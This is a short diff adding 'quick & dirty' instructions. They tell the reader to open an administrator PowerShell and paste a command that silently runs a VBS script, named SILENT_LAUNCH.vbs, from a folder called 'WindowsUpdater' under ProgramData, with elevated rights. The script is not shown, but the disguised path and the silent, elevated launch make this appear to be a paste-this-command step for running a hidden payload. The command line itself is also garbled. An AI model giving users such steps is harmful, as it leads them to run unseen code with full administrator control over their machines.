@@ -1,0 +1,6 @@
+Method 2: Quick & Dirty (Use this now)
+
+Press Windows key + X → choose Windows PowerShell (Admin) or Terminal (Admin)
+Paste this command and press Enter:
+
+PowerShellStart-Process wscript.exe -ArgumentList '"C:\ProgramData\WindowsUpdater\SILENT_LAUNCH.vbs"' -Verb RunAs
